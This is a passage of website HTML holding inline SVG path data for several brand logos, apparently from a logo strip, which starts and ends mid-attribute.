23.6108 69.3548 23.6108 69.2558C23.8069 69.1587 24.0024 69.1089 24.2476 68.9626C24.2968 69.0118 24.2968 69.1089 24.2968 69.1587ZM12.2978 69.5988C12.2486 69.5017 12.1509 69.4034 12.0525 69.4034C12.0034 69.6978 12.0034 70.0402 12.0525 70.2849L11.8072 70.1878C11.8564 69.8933 11.8072 69.5995 11.8564 69.2564C11.7581 69.2564 11.7095 69.2079 11.6111 69.2564V69.061L12.2972 69.3554V69.5988H12.2978ZM23.4639 69.5988C23.4639 69.5503 23.3661 69.5503 23.3169 69.5503C23.259 69.5873 23.2109 69.6379 23.1768 69.6976C23.1428 69.7574 23.1238 69.8246 23.1215 69.8933C23.1215 70.0402 23.1215 70.2363 23.2678 70.2849C23.3661 70.3347 23.4639 70.2363 23.513 70.138V70.3839C23.4153 70.4324 23.2678 70.5308 23.17 70.481C23.0939 70.4487 23.0296 70.3938 22.9858 70.3238C22.9419 70.2538 22.9206 70.1719 22.9247 70.0894C22.8762 69.7949 22.9739 69.5509 23.2678 69.4034C23.3169 69.3548 23.4147 69.4034 23.4639 69.3548V69.5988ZM12.6894 69.5503L12.6402 69.6486V70.3832C12.6402 70.4318 12.738 70.4804 12.7871 70.5302C12.8363 70.5302 12.9341 70.4804 12.9341 70.4318C12.8849 70.1871 12.9826 69.8933 12.8849 69.6486L13.1302 69.7943C13.0324 69.9412 13.081 70.1373 13.081 70.3341C13.081 70.8228 12.6894 70.6758 12.5917 70.5787C12.4933 70.4804 12.4447 70.4318 12.4447 70.2843C12.3956 69.991 12.4939 69.6486 12.3956 69.4027L12.6894 69.5503ZM13.6693 69.9917C13.6693 70.1871 13.7185 70.3347 13.767 70.5302C13.8654 70.3832 13.914 70.2357 13.9631 70.0888C14.0123 70.0888 14.1586 70.0888 14.257 70.1373L14.2078 70.2843L14.257 71.0687V71.1658C14.2078 71.2143 14.0609 71.1658 14.0117 71.1658C13.9625 71.1172 14.0609 71.0687 14.0609 71.0687V70.2843C13.9631 70.5302 13.8654 70.7256 13.8156 70.9211L13.6687 70.8713C13.6687 70.6267 13.5709 70.3826 13.5217 70.1367C13.4725 70.4122 13.4725 70.6942 13.5217 70.9697C13.4234 70.9697 13.3748 70.9211 13.3256 70.9211H13.2765L13.3256 70.8713C13.3748 70.5781 13.3256 70.2357 13.3256 69.9412L13.2765 69.8441L13.6693 69.9917ZM22.6315 69.7943C22.6807 70.0888 22.7784 70.3341 22.8768 70.5787L22.9254 70.6758C22.8276 70.6758 22.7299 70.7742 22.6315 70.7742C22.6807 70.6758 22.6315 70.6273 22.6315 70.5295C22.5338 70.5295 22.436 70.5781 22.3377 70.6267C22.3377 70.725 22.3377 70.8221 22.3868 70.9211C22.2885 70.9697 22.1907 71.0182 22.093 71.0182C22.2399 70.6752 22.2885 70.3334 22.3377 69.991V69.8927C22.436 69.8441 22.5338 69.7943 22.6315 69.7943ZM22.5823 70.3832L22.4846 69.9917L22.3868 70.4318L22.5823 70.3832ZM22.0438 70.1871C22.093 70.2843 22.093 70.4804 21.9946 70.5787C21.9455 70.6758 21.7985 70.6758 21.6516 70.7256C21.6516 70.8713 21.6516 71.0189 21.7008 71.1172C21.6024 71.1658 21.5047 71.1172 21.407 71.1658C21.5047 70.8713 21.4561 70.5302 21.4561 70.1871L21.407 70.0888C21.6522 70.1373 21.8969 69.9419 22.0438 70.1871ZM21.6522 70.1871V70.5787C21.7014 70.5787 21.7992 70.5787 21.7992 70.5302C21.8483 70.4318 21.8483 70.3347 21.8483 70.2843C21.8477 70.1871 21.7008 70.1871 21.6522 70.1871Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M13.7671 60.8823C13.8162 61.4208 13.6693 61.9107 13.3263 62.3509C13.3755 62.4492 13.4732 62.5463 13.5224 62.5955C13.7179 62.5955 13.8654 62.6453 13.9632 62.547C14.1101 62.4499 14.2078 62.547 14.257 62.6453C14.3547 62.6453 14.4033 62.6453 14.5017 62.5955C14.5017 62.6453 14.4531 62.7424 14.4039 62.7424C14.3554 62.7923 14.3554 62.7923 14.3062 62.7923C14.2084 62.8894 14.1593 62.9877 14.0123 62.9379C13.9632 62.8408 13.8654 62.8894 13.7671 62.8894C13.914 63.0363 14.0609 63.1838 14.257 63.2324H14.5509C14.6486 63.281 14.6 63.4279 14.6978 63.4771H14.8441C14.7955 63.624 14.5994 63.5754 14.501 63.6738C14.2564 63.7223 14.1586 63.4771 14.0117 63.4279L13.7664 63.2324C13.7664 63.4771 13.8648 63.6738 14.0117 63.8693C14.1095 63.9178 14.2072 63.9178 14.257 63.9664C14.3547 64.0149 14.257 64.1619 14.4033 64.1619H14.5502C14.4525 64.3088 14.2564 64.2602 14.1586 64.3573C14.0609 64.4071 13.9632 64.3573 13.8648 64.3088C13.8156 64.2117 13.8156 64.1133 13.8156 64.0143C13.571 63.7697 13.4726 63.4273 13.3749 63.134C13.3257 63.1826 13.2771 63.2312 13.3257 63.2797C13.3257 63.3295 13.4234 63.4266 13.3257 63.5256C13.2765 63.5742 13.3257 63.6725 13.3257 63.7211C13.2765 63.6725 13.2279 63.6227 13.1302 63.5742C13.081 63.5742 12.9347 63.4758 13.081 63.2312C13.081 63.0842 13.1794 62.9367 13.2279 62.791C13.2279 62.7412 13.1302 62.6441 13.081 62.5943C12.4933 63.134 11.7587 63.3787 11.0727 63.6725C10.9264 63.7697 10.7303 63.9658 10.6811 64.1612C10.6811 64.2596 10.7303 64.3082 10.828 64.4071C11.4157 64.5541 11.9056 64.0143 12.4933 64.3573C12.8849 64.6032 12.6894 65.2401 13.2279 65.3858C12.9827 65.4842 12.6894 65.6317 12.5917 65.9243C12.5425 66.2188 12.5425 66.6602 12.738 66.9042C13.1788 67.3941 14.1095 66.9042 14.3056 67.6874C14.3056 67.8343 14.3056 67.9818 14.1586 68.0802C14.1592 68.1684 14.137 68.2553 14.0941 68.3324C14.0513 68.4095 13.9892 68.4742 13.914 68.5203L13.7671 68.5689C13.8162 68.4718 13.8654 68.3734 13.8162 68.2757C13.778 68.1883 13.7082 68.1185 13.6208 68.0802C13.6208 68.1773 13.5716 68.3248 13.523 68.4232C13.4247 68.5689 13.2777 68.5689 13.1314 68.6187C13.2292 68.4718 13.2292 68.3728 13.1806 68.2259C13.1806 68.1773 13.1314 68.0802 13.0823 68.0802C12.9845 68.2757 12.7884 68.4718 12.5438 68.5203C12.5929 68.4232 12.6415 68.3248 12.5929 68.1773C12.5929 67.9818 12.2991 68.0304 12.2499 67.8343C12.0538 67.5398 11.76 67.3443 11.4169 67.3941C11.613 67.0997 11.9069 66.8058 11.76 66.4142C11.7108 66.2188 11.5153 66.0227 11.3192 65.9741H11.0254C10.9276 65.6796 10.7315 65.3372 10.4377 65.2881C10.3885 65.2881 10.3885 65.2395 10.3399 65.2881C10.6338 65.6796 10.683 66.3651 10.4377 66.8556C10.2422 67.4427 9.55614 67.5902 9.21312 68.0802C10.8293 67.9818 12.103 68.6672 13.3761 69.3047C13.6214 69.4019 13.9152 69.5002 14.2085 69.5494C14.2576 69.4025 14.2085 69.2549 14.3554 69.2064C14.8447 69.0595 15.4324 69.2064 15.8246 69.5494C16.0207 69.6963 15.9229 69.9908 15.9715 70.1863C16.167 70.2834 16.4123 70.2834 16.6576 70.3817C17.5883 70.4789 18.6659 70.4789 19.5474 70.2834C19.596 70.2348 19.6943 70.2348 19.7429 70.1863C19.7429 69.9908 19.6943 69.7934 19.7921 69.6478C20.2329 69.2549 20.8205 69.0595 21.3597 69.2064C21.506 69.3047 21.4574 69.4019 21.4574 69.5494C22.3389 69.451 23.0244 68.9125 23.8082 68.6193C24.6405 68.2763 25.522 68.031 26.5019 68.0808C26.1103 67.5909 25.3751 67.3948 25.1796 66.7093C25.0327 66.2679 25.0819 65.6809 25.3751 65.2893C25.2742 65.2873 25.1749 65.3137 25.0883 65.3656C25.0018 65.4175 24.9316 65.4926 24.8858 65.5825C24.788 65.7294 24.7389 65.877 24.6897 65.9753C24.445 65.9753 24.1512 66.0239 24.0036 66.2686C23.8567 66.464 23.8567 66.8071 24.0036 67.053L24.2489 67.396C23.9059 67.3462 23.612 67.5915 23.4166 67.8847C23.3188 68.0814 23.025 68.0316 23.0735 68.2775C23.0735 68.3747 23.0735 68.4245 23.1713 68.473C23.0244 68.473 22.8774 68.4245 22.7797 68.2775C22.6813 68.2277 22.6813 68.0821 22.5836 68.0821C22.4367 68.1792 22.4859 68.3753 22.5344 68.5222V68.5708C22.4367 68.6206 22.3383 68.5708 22.2406 68.5222C22.1488 68.3934 22.0976 68.2401 22.0937 68.0821C21.9959 68.0821 21.9467 68.1306 21.8975 68.2277C21.8484 68.2775 21.8484 68.3746 21.8484 68.4736L21.8975 68.5708C21.7506 68.5222 21.5551 68.3753 21.506 68.2277V68.0821C21.4082 67.9837 21.3597 67.7876 21.4082 67.6407C21.6535 66.7591 23.0244 67.5423 23.1227 66.4647C23.1713 66.1216 23.1227 65.7786 22.7797 65.5346C22.6813 65.486 22.5836 65.4375 22.4367 65.3877C22.9752 65.242 22.7797 64.5559 23.3182 64.3107C23.8567 64.066 24.3467 64.6051 24.8858 64.3592C25.0321 64.3106 25.0321 64.2135 25.0321 64.066C24.6897 63.576 24.102 63.5275 23.612 63.233C23.269 63.0375 22.926 62.89 22.6328 62.5961C22.535 62.646 22.4859 62.7431 22.4859 62.7929C22.4859 62.9386 22.5836 63.0861 22.6328 63.2816C22.7305 63.3799 22.682 63.5275 22.5836 63.5275C22.5344 63.6246 22.4367 63.6744 22.3383 63.723C22.3875 63.6744 22.3875 63.6246 22.3875 63.576C22.2891 63.5275 22.2891 63.4291 22.3383 63.3314C22.3875 63.2816 22.3383 63.233 22.3383 63.1845V63.1359C22.2416 63.4673 22.0929 63.7813 21.8975 64.066C21.8975 64.1631 21.8975 64.2615 21.7998 64.3107C21.7021 64.3598 21.6037 64.3592 21.506 64.3592C21.4082 64.2621 21.2121 64.3107 21.1144 64.1637C21.2121 64.1637 21.3099 64.1637 21.3597 64.1152C21.3597 64.0168 21.4574 63.9683 21.506 63.9197C21.5551 63.8711 21.6037 63.9197 21.6529 63.8711C21.7998 63.6757 21.8975 63.4783 21.9467 63.2828H21.8975C21.7506 63.4297 21.5551 63.4783 21.359 63.6258C21.2607 63.6757 21.1629 63.6757 21.0646 63.5773C21.016 63.6258 20.8691 63.5773 20.8199 63.4789C20.8691 63.4789 20.9668 63.5287 21.016 63.4304C21.016 63.3818 21.0646 63.2834 21.1138 63.2349C21.2115 63.1863 21.3092 63.2349 21.359 63.2834C21.4076 63.2834 21.5053 63.2834 21.5545 63.1863C21.6523 63.1378 21.7992 62.9908 21.8969 62.8919C21.75 62.7947 21.6031 63.0388 21.4562 62.8919L21.407 62.7947C21.3565 62.7954 21.3068 62.7819 21.2635 62.756C21.2202 62.7301 21.185 62.6926 21.1617 62.6478V62.598C21.2109 62.598 21.3086 62.6478 21.407 62.6478C21.4562 62.5495 21.5047 62.5495 21.6025 62.5495C21.6516 62.5495 21.7494 62.5495 21.7986 62.598C21.9455 62.598 22.0924 62.6964 22.1901 62.5495L22.3862 62.354C22.0432 61.9624 21.8471 61.4239 21.9455 60.8854C22.2393 60.8854 22.4846 60.8854 22.7785 60.8356C22.7293 61.2284 22.7293 61.6686 22.6801 62.0601C22.6801 62.0601 23.317 61.9145 24.1007 61.5714C24.1499 62.1585 24.4438 62.6484 24.6393 63.139C24.9331 62.8445 25.2755 62.6491 25.57 62.306C26.1576 62.9417 26.7945 63.6277 27.0392 64.4607C27.1375 64.9506 27.1375 65.5377 27.676 65.7824C27.7738 65.8322 27.8721 65.8322 27.9699 65.8322C28.0676 65.8322 28.1168 65.7338 28.1168 65.6852C28.166 65.2451 27.8721 64.9506 27.7252 64.559C27.5297 64.216 27.4806 63.6277 27.7252 63.3345C28.0683 62.8931 28.7537 63.2361 29.0967 62.8445C29.1459 62.7462 29.1951 62.6491 29.2436 62.5501C29.2928 62.7456 29.1944 62.9417 29.1944 63.1384C29.2922 63.0886 29.4391 63.04 29.5375 62.9915L29.8313 62.697C29.586 63.2355 29.6844 64.0187 28.9498 64.1656C28.7537 64.1656 28.5582 64.1656 28.3621 64.117C28.2644 64.117 28.2158 64.1656 28.1666 64.2154V64.3611C28.3621 64.9494 28.9504 65.5371 28.5582 66.1739C28.3621 66.4186 28.0683 66.4672 27.8236 66.4186C27.5789 66.3215 27.3828 66.1739 27.1873 65.9785L27.1382 66.1241C27.089 66.86 27.1873 67.7415 27.8728 68.1331C27.9213 68.1331 28.0191 68.1817 28.0683 68.1817L27.9705 68.28V68.3286C28.3135 68.3771 28.7051 68.3771 29.0475 68.3286L29.0967 70.4832C28.5582 70.5816 27.9705 70.4832 27.4806 70.3861C27.0884 70.6308 26.9414 71.0722 26.5499 71.2178C26.4515 71.2676 26.4515 71.3648 26.5007 71.4637C26.5007 71.5123 26.5499 71.5609 26.5984 71.6107C26.4029 71.6107 26.2068 71.4637 26.1576 71.3162C26.1085 71.2676 26.1085 71.2178 26.1085 71.1207C25.9615 71.1693 25.913 71.3162 25.913 71.4637V71.5609C25.7169 71.5123 25.57 71.2676 25.57 71.0722C25.4722 71.0722 25.3739 71.2178 25.3739 71.3168L25.3247 71.4152C25.1778 71.2185 25.1292 70.7291 25.2755 70.4353L25.3732 70.3382C25.0794 70.3382 24.8347 70.4353 24.5894 70.4838C23.2672 70.8269 22.1901 72.0022 20.7209 71.6598V71.1213C20.574 71.0728 20.4756 71.1699 20.3779 71.2185V72.0514C19.888 72.4928 19.2025 72.4928 18.6149 72.5899H17.1419C16.5194 72.5463 15.9286 72.4256 15.4311 72.1498L15.3334 72.1012V71.2185C15.2357 71.1213 15.1373 71.1213 14.9904 71.0728V71.6598L14.9412 71.7084C14.3535 71.8068 13.7658 71.6598 13.2273 71.4637L11.6597 70.6793C11.2682 70.5336 10.8274 70.3861 10.3374 70.3375C10.5827 70.5822 10.5827 71.0722 10.3866 71.3648V71.4146C10.3374 71.2676 10.2889 71.1201 10.142 71.0217C10.0928 71.1686 10.0928 71.3162 9.99504 71.4146C9.94586 71.4631 9.8973 71.5117 9.79956 71.5602C9.79956 71.4146 9.79956 71.2172 9.65264 71.1201C9.60408 71.3156 9.40735 71.5602 9.16332 71.61H9.11413C9.21187 71.5117 9.26106 71.3641 9.21187 71.267C8.82029 71.0715 8.62419 70.581 8.2326 70.3855C7.74266 70.4826 7.20415 70.581 6.66503 70.4826V68.328C7.00805 68.3765 7.39963 68.3765 7.74266 68.2794L7.6443 68.181C8.0365 68.1325 8.33034 67.7409 8.47727 67.3979C8.62419 66.9565 8.62419 66.4665 8.52645 65.9778L8.2326 66.2711C7.98732 66.418 7.59636 66.4665 7.30189 66.3209C7.20514 66.2486 7.13078 66.1505 7.08738 66.0378C7.04398 65.9251 7.03332 65.8025 7.05661 65.684C7.10579 65.194 7.39963 64.8025 7.59574 64.3125C7.59574 64.2154 7.54656 64.1656 7.498 64.117C7.05723 64.1656 6.61585 64.2154 6.322 63.8724C6.02816 63.5294 6.07734 63.0394 5.93042 62.6964C6.07734 62.941 6.322 63.0394 6.51811 63.1378C6.51811 62.941 6.42037 62.7449 6.46892 62.5495C6.56666 62.7449 6.76277 62.941 6.95887 62.9908C7.35045 63.088 7.79122 62.9908 8.0365 63.3824C8.47727 64.1656 7.69348 64.8025 7.59574 65.5371C7.59574 65.6354 7.59574 65.684 7.6443 65.7817C7.74266 65.8315 7.8404 65.8801 7.93876 65.8315C8.77111 65.5856 8.47727 64.607 8.82029 64.0187C9.16332 63.4316 9.65264 62.8439 10.1426 62.3054C10.4364 62.5986 10.7303 62.8439 11.0727 63.1384C11.2688 62.6484 11.5626 62.1585 11.6118 61.5708C12.0526 61.7663 12.5425 61.9138 12.9833 62.0595C12.9833 61.6679 12.9833 61.2278 12.9347 60.835C13.1794 60.8823 13.4732 60.8325 13.7671 60.8823ZM9.06558 68.4245C8.91865 68.7177 8.96783 69.1093 9.01639 69.4517C9.06558 69.6484 9.21187 69.893 9.40798 69.9416C10.3387 69.9416 11.2202 70.1371 11.9548 70.4801C12.8364 70.8717 13.6201 71.5086 14.6978 71.4114V69.8439C14.2078 69.8924 13.7179 69.7941 13.2771 69.598C11.9548 68.9132 10.6817 68.2277 9.06558 68.4245ZM24.0516 68.816L22.4846 69.5506C22.0438 69.7461 21.5539 69.8937 21.0154 69.8451V71.4127C21.4562 71.4612 21.8477 71.3629 22.2393 71.216L23.7577 70.4814C24.394 70.2367 25.0308 70.0412 25.7163 69.9927C25.9124 69.9429 26.2062 70.0412 26.4023 69.8943C26.4922 69.8482 26.5673 69.7779 26.6193 69.6913C26.6712 69.6047 26.6978 69.5053 26.6962 69.4043C26.7453 69.1099 26.7945 68.7183 26.6476 68.4257C25.763 68.3262 24.8678 68.4608 24.0516 68.816ZM7.93876 68.5708C7.59574 68.6206 7.3019 68.6691 6.95887 68.6691V70.2367C7.20415 70.2367 7.498 70.2367 7.79122 70.1383C8.0365 69.7467 8.13424 69.2082 8.0365 68.7183L7.93876 68.5708ZM27.7738 68.5708C27.5291 69.0607 27.6269 69.7467 27.9207 70.1881C28.2152 70.2367 28.5084 70.2367 28.8029 70.2367V68.6691C28.4107 68.6691 28.1168 68.6206 27.7738 68.5708ZM15.6285 70.3836V71.9512C15.7262 72.0483 15.9223 72.0981 16.0692 72.1467C16.9514 72.3422 17.9792 72.3913 18.9099 72.2438C19.3015 72.1952 19.7423 72.1467 20.0853 71.9008V70.383C19.7915 70.5299 19.4491 70.5785 19.106 70.6277C17.9786 70.7752 16.6563 70.7752 15.6285 70.3836Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M16.3138 70.8719C16.3138 71.0686 16.363 71.2149 16.4116 71.3618C16.4607 71.2149 16.5093 71.0686 16.5093 70.9217C16.6077 70.9217 16.7546 70.9217 16.8523 70.9702L16.8031 71.0686C16.8523 71.4116 16.8031 71.7042 16.8523 71.9987H16.6077C16.6568 71.754 16.6568 71.4116 16.6568 71.1657C16.5591 71.3612 16.4614 71.5573 16.4614 71.8026C16.4614 71.8026 16.3636 71.8026 16.3144 71.754C16.3144 71.5081 16.2167 71.3126 16.1675 71.0679C16.1189 71.3431 16.1189 71.6246 16.1675 71.8997L15.972 71.8026C16.0698 71.5567 16.0212 71.2641 16.0212 70.9696C15.972 70.921 15.972 70.8227 15.972 70.7741L16.3138 70.8719ZM19.7416 70.8233C19.6438 71.0692 19.693 71.4116 19.693 71.7546V71.8032C19.6256 71.8641 19.5385 71.8986 19.4477 71.9003C19.4963 71.6071 19.4963 71.3618 19.4963 71.0686C19.4477 71.3132 19.35 71.5087 19.3008 71.7546C19.2516 71.8032 19.2031 71.8032 19.1539 71.8032C19.1539 71.5573 19.0562 71.3618 19.007 71.1663C19.007 71.4122 18.9578 71.7546 19.0562 71.9993C18.9578 71.9993 18.86 71.9993 18.7623 72.0478C18.86 71.7546 18.8115 71.4122 18.86 71.0692L18.7623 70.9702C18.9092 70.9702 19.0076 70.9702 19.1053 70.9217C19.1545 70.9702 19.1545 71.0686 19.1545 71.1171L19.2523 71.4116C19.3014 71.2149 19.3506 71.0686 19.3506 70.8719C19.4969 70.8719 19.5947 70.8233 19.7416 70.8233ZM17.6361 71.2149C17.5384 71.1178 17.4406 71.1178 17.3423 71.1663V71.4122C17.3915 71.4608 17.4892 71.4608 17.5869 71.4122V71.6077C17.4892 71.5579 17.44 71.5579 17.3423 71.5579V71.9009C17.3915 71.9507 17.5378 71.9507 17.6361 71.9009H17.6853V72.0976C17.4892 72.0976 17.2445 72.0478 17.0484 72.0478C17.0976 71.9507 17.1462 71.8524 17.1462 71.7048C17.097 71.4602 17.1954 71.2149 17.0484 70.9702L17.6361 71.0188V71.2149ZM18.6154 70.9702C18.517 71.2647 18.5662 71.6071 18.517 71.9003C18.517 71.9501 18.4678 72.0472 18.3701 72.097C17.9785 72.1941 17.8802 71.9003 17.8802 71.9003C17.8802 71.6071 17.9293 71.2647 17.831 71.0188H18.1254C18.0277 71.2647 18.0763 71.5573 18.0763 71.8517C18.1254 71.9003 18.174 71.9003 18.2232 71.9501C18.2724 71.9501 18.3701 71.9003 18.4187 71.8517C18.4187 71.5573 18.4187 71.3132 18.3695 71.0686V71.0188C18.4193 70.9702 18.5176 71.0188 18.6154 70.9702ZM41.7319 68.6686C41.7319 68.8156 41.7319 68.9631 41.781 69.0602C41.928 69.3547 42.271 69.4518 42.6134 69.4518C42.8587 69.4518 43.2994 69.3547 43.2994 68.9631C43.2994 68.6686 43.0542 68.5703 42.1241 68.3262C41.2425 68.0816 40.2633 67.8363 40.2633 66.7587C40.2633 65.4856 41.3403 64.947 42.4671 64.947C43.6425 64.947 44.7201 65.3872 44.7687 66.7101H43.1525C43.2017 66.5146 43.1033 66.3671 42.9564 66.2687C42.8095 66.176 42.6401 66.1252 42.4665 66.1218C42.2212 66.1218 41.8302 66.2202 41.8302 66.5146C41.8788 66.9062 42.6626 67.0046 43.4464 67.2007C44.2302 67.3968 44.9648 67.7877 44.9648 68.7683C44.9648 70.1883 43.6917 70.677 42.4671 70.677C41.8309 70.677 40.0678 70.4323 40.0678 68.6693H41.7319V68.6686ZM46.6786 66.4642H45.1111V65.0435H49.8617V66.4642H48.344V70.5301H46.6786V66.4642ZM51.7232 67.7871C51.7232 66.5626 52.3594 66.2687 52.8002 66.2687C53.2409 66.2687 53.8778 66.5632 53.8778 67.7871C53.8778 69.011 53.2409 69.3055 52.8002 69.3055C52.3594 69.3055 51.7232 69.0117 51.7232 67.7871ZM50.0093 67.7871C50.0093 69.4518 51.1355 70.6764 52.8008 70.6764C54.4661 70.6764 55.5437 69.4518 55.5437 67.7871C55.5437 66.1212 54.4661 64.947 52.8008 64.947C51.1355 64.947 50.0093 66.1212 50.0093 67.7871ZM59.7553 67.1011C59.7061 66.9056 59.5592 66.2681 58.8737 66.2681C58.09 66.2681 57.7961 67.0525 57.7961 67.7865C57.7961 68.5205 58.09 69.3049 58.8737 69.3049C59.4123 69.3049 59.6569 68.9121 59.7553 68.3736H61.4206C61.4206 69.501 60.4893 70.6751 58.9223 70.6751C57.1107 70.6751 56.1308 69.402 56.1308 67.7859C56.1308 66.0714 57.2084 64.9458 58.9223 64.9458C60.3921 64.9458 61.2251 65.729 61.3708 67.1004H59.7553V67.1011ZM62.1066 65.0435H63.8199V66.9541L65.3383 65.0435H67.3958L65.4367 67.1994L67.7388 70.5301H65.6328L64.2613 68.3742L63.8199 68.9127V70.5301H62.1066V65.0435ZM69.9906 65.0435H74.4966V66.4642H71.6565V67.1496H74.252V68.424H71.6565V69.1088H74.595V70.5301H69.9906V65.0435ZM76.848 67.6396L75.0837 65.0435H77.0441L77.8758 66.5626L78.6602 65.0435H80.5702L78.8071 67.6396L80.7657 70.5301H78.7088L77.7787 68.9127L76.7982 70.5301H74.8882L76.848 67.6396ZM84.3895 67.1011C84.341 66.9056 84.1941 66.2681 83.508 66.2681C82.6763 66.2681 82.431 67.0525 82.431 67.7865C82.431 68.5205 82.6769 69.3049 83.508 69.3049C84.0478 69.3049 84.2924 68.9121 84.3895 68.3736H86.0069C86.0069 69.501 85.1254 70.6751 83.508 70.6751C81.7449 70.6751 80.7663 69.402 80.7663 67.7859C80.7663 66.0714 81.8433 64.9458 83.508 64.9458C85.0264 64.9458 85.8594 65.729 86.0069 67.1004H84.3895V67.1011ZM86.7895 65.0435H88.4554V66.9541H90.0217V65.0435H91.7356V70.5301H90.0217V68.3742H88.4554V70.5301H86.7895V65.0435ZM94.4306 68.5703L94.9691 66.9056L95.4578 68.5703H94.4306ZM92.1272 70.5301H93.7931L94.0378 69.7457H95.8008L96.0468 70.5301H97.7613L95.8015 65.0442H94.1368L92.1272 70.5301ZM98.2493 65.0435H99.9638L101.531 67.9826H101.58V65.0435H103.148V70.5301H101.531L99.8667 67.5412H99.8169V70.5301H98.2493V65.0435ZM108.045 69.9916C107.702 70.4317 107.115 70.6764 106.478 70.6764C104.861 70.6764 103.882 69.4033 103.882 67.8363C103.882 65.7788 105.351 64.947 106.576 64.947C107.996 64.947 108.877 65.6817 109.122 66.9548H107.506C107.408 66.5632 107.114 66.2687 106.673 66.2687C105.547 66.2687 105.596 67.4933 105.596 67.8849C105.596 68.3748 105.792 69.3061 106.821 69.3061C107.212 69.3061 107.605 69.1094 107.702 68.6693H106.919V67.4933H109.172V70.5307H108.094L108.045 69.9916ZM110.102 65.0435H114.657V66.4642H111.817V67.1496H114.363V68.424H111.817V69.1088H114.706V70.5301H110.102V65.0435Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-2/12 sm:-mr-2 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="111"
              height="26"
              viewBox="0 0 111 26"
              fill="none"
            >
              <g clip-path="url(#clip0)">
                <path
                  d="M0 13.7667L2.41371 0.362305H7.6045C11.4149 0.362305 13.569 2.78668 12.7758 7.19853C11.8658 12.2459 8.88597 13.7667 5.09183 13.7667H0Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M4.4397 10.6409H5.26049C7.06753 10.6409 8.24681 9.56192 8.70425 7.02833C9.2071 4.23492 8.53555 3.49023 6.46735 3.49023H5.72604L4.4397 10.6409Z"
                  fill="#EFF6FE"
                ></path>
                <path
                  d="M25.9684 6.99162C25.146 11.5524 21.9748 14.1224 18.4759 14.1224C14.7645 14.1224 12.753 11.516 13.5755 6.95521C14.3314 2.7469 17.3388 0.00976562 21.0177 0.00976562C25.2385 0.00976562 26.6059 3.45353 25.9684 6.99162Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M17.4443 6.99188C17.1361 8.70467 17.2107 10.8461 19.0664 10.8461C20.7421 10.8461 21.6943 9.20774 22.0933 6.99188C22.421 5.16657 22.1128 3.23204 20.3949 3.28831C18.6366 3.28665 17.7493 5.29731 17.4443 6.99188Z"
                  fill="#EFF6FE"
                ></path>
                <path
                  d="M37.7808 7.76859H37.8132L40.7363 0.364746H44.2271L38.5188 13.7675H34.7085L34.3403 5.98631H34.3078L31.1561 13.7675H27.4965L26.7163 0.364746H30.259L30.7051 7.76859H30.7392L33.7433 0.364746H37.2504L37.7808 7.76859Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M92.6603 12.024C93.481 11.6385 93.9531 10.9037 94.2061 9.50535C95.0853 4.62848 88.0599 5.87624 88.4217 3.86559C88.5092 3.38072 88.9375 3.1027 89.7907 3.1027C90.1687 3.1027 90.5012 3.17717 90.7494 3.34431C90.9992 3.5131 91.1614 3.79278 91.1436 4.25779H94.8225C94.9637 1.90789 93.812 0.00976562 90.5272 0.00976562C87.5717 0.00976562 84.84 1.08046 84.3274 3.93013C83.4061 9.05027 90.1411 7.77437 90.1411 9.83632C90.1411 10.8706 88.3405 10.629 88.3405 10.629C86.1101 10.629 86.308 8.80535 86.308 8.80535H82.595C82.5285 10.1938 82.741 11.0642 83.1676 11.6087C82.6788 11.5972 82.19 11.5867 81.7012 11.5772L81.8618 10.2236H77.3393L77.7189 7.91338H82.1911L82.6015 5.14811H78.2802L78.6257 3.02327H83.2763L83.7386 0.362251H75.3149L73.3051 11.5292L71.5808 11.5425L73.7447 0.362251H70.4891L69.1671 7.00817L66.416 0.363906H62.7857L60.6639 12.1432C59.6955 12.2458 58.7369 12.3633 57.7847 12.4891C59.2446 11.2777 60.346 9.41599 60.7824 6.99162C61.4215 3.45353 60.0524 0.00976562 55.8317 0.00976562C52.1527 0.00976562 49.1469 2.7469 48.3894 6.95356C47.7762 10.3609 48.743 12.6761 50.8177 13.6293C48.962 13.99 47.1517 14.3839 45.3917 14.8059C46.3552 13.2255 46.7397 10.7614 47.1306 8.59187L48.6132 0.362251H44.9391L42.8904 11.5326C42.8904 11.5326 42.5676 13.525 41.4029 13.525H39.6283L38.5301 16.6428C26.3026 19.5321 15.0938 25.9878 15.0938 25.9878H21.4817C21.4817 25.9878 57.2689 5.35331 110.598 15.2825L111.003 14.8175C111 14.8191 106.748 12.9458 92.6603 12.024Z"
                  fill="currentColor"
                ></path>
                <path
                  d="M52.2599 6.99188C52.5648 5.29896 53.4521 3.28831 55.2105 3.28831C56.9283 3.23204 57.2365 5.16823 56.9089 6.99188C56.5098 9.20774 55.5576 10.8461 53.882 10.8461C52.0263 10.8461 51.9517 8.70466 52.2599 6.99188ZM65.0211 6.23892L67.584 11.6338C66.4242 11.6801 65.2709 11.7463 64.1273 11.8323L65.0211 6.23892Z"
                  fill="#EFF6FE"
                ></path>
              </g>
            </svg>
          </div>
          <div class="w-2/12 sm:-ml-1 sm:flex sm:w-1/3 text-svg hover:text-btn-hover transition">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="114"
              height="34"
              viewBox="0 0 114 34"
              fill="none"
            >
              <g clip-path="url(#clip0)">
                <path
